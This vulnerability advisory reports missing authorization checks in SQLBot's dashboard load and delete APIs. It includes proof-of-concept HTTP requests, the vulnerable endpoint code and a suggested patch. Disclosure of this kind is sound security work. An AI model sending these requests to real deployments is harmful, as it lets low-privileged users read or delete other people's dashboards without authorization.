# Missing Authorization in Dashboard Management APIs

## 1. Vulnerability Title
Missing Authorization Check in Dashboard Management APIs of SQLBot

## 2. Product Details
* **Vendor:** SQLBot Team
* **Product:** SQLBot
* **Affected Version(s):** <= v1.3.0
* **Fixed Version:** N/A

## 3. Vulnerability Type (CWE)
* **CWE ID:** CWE-285 (Improper Authorization)
* **Type Name:** Broken Function Level Authorization (BFLA)

## 4. Description (Crucial for CVE Entry)
SQLBot version 1.3.0 and earlier contains missing authorization vulnerabilities in the Dashboard Management APIs, allowing any authenticated user to load dashboard resources and delete any dashboard resource without proper authorization checks.

## 5. Impact
* **Impact Description:** An authenticated attacker with low privileges can:
  - Load any dashboard resource data
  - Delete any dashboard resource, causing data loss and service disruption
* **Attack Vector:** Network (Remote)
* **Privileges Required:** Low (Any authenticated user)

## 7. Proof of Concept (PoC) / Steps to Reproduce

### Prerequisites
1. Deploy SQLBot application
2. Login as a low-privileged user and obtain a valid `x-sqlbot-token`

### PoC 1: Load Dashboard Resource (POST /dashboard/load_resource)

```http
POST /api/v1/dashboard/load_resource HTTP/1.1
Host: target-server
Content-Type: application/json
x-sqlbot-token: <valid_user_token>

{
    "id": "target-resource-id"
}
```

**Result:** Returns dashboard resource data without authorization check.

### PoC 2: Delete Dashboard Resource (DELETE /dashboard/delete_resource/{id})

```http
DELETE /api/v1/dashboard/delete_resource/target-resource-id HTTP/1.1
Host: target-server
x-sqlbot-token: <valid_user_token>
```

**Result:** Deletes dashboard resource without authorization check.

## 8. Vulnerable Code Location

**File:** `backend/apps/dashboard/api/dashboard_api.py`

| Endpoint | Method | Lines | Description |
|----------|--------|-------|-------------|
| /dashboard/load_resource | POST | 16-18 | Load dashboard resource |
| /dashboard/delete_resource/{id} | DELETE | 31-33 | Delete dashboard resource |

### Vulnerable Code: Load Resource (Lines 16-18)

```python
@router.post("/load_resource")
async def load_resource_api(session: SessionDep, dashboard: QueryDashboard):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    return load_resource(session=session, dashboard=dashboard)
```

### Vulnerable Code: Delete Resource (Lines 31-33)

```python
@router.delete("/delete_resource/{resource_id}")
async def delete_resource_api(session: SessionDep, resource_id: str):
    # Missing: current_user: CurrentUser parameter
    # Missing: Authorization check
    return delete_resource(session, resource_id)
```

## 9. Remediation

Add proper authorization checks to all affected endpoints:

```python
from common.core.deps import CurrentUser, Trans

@router.post("/load_resource")
async def load_resource_api(session: SessionDep, current_user: CurrentUser, dashboard: QueryDashboard):
    resource = get_resource(session, dashboard.id)
    # Verify ownership or workspace access
    if resource.oid != current_user.oid and not current_user.isAdmin:
        raise HTTPException(status_code=403, detail="Access denied")
    return load_resource(session=session, dashboard=dashboard)

@router.delete("/delete_resource/{resource_id}")
async def delete_resource_api(session: SessionDep, current_user: CurrentUser, trans: Trans, resource_id: str):
    resource = get_resource(session, resource_id)
    # Verify ownership
    if resource.create_by != current_user.id and not current_user.isAdmin:
        raise Exception(trans('i18n_permission.no_permission', url='', msg=''))
    return delete_resource(session, resource_id)
```

## 10. Summary Table

| Endpoint | Method | Severity | Impact |
|----------|--------|----------|--------|
| /dashboard/load_resource | POST | Medium | Load any dashboard resource |
| /dashboard/delete_resource/{id} | DELETE | High | Delete any dashboard resource |
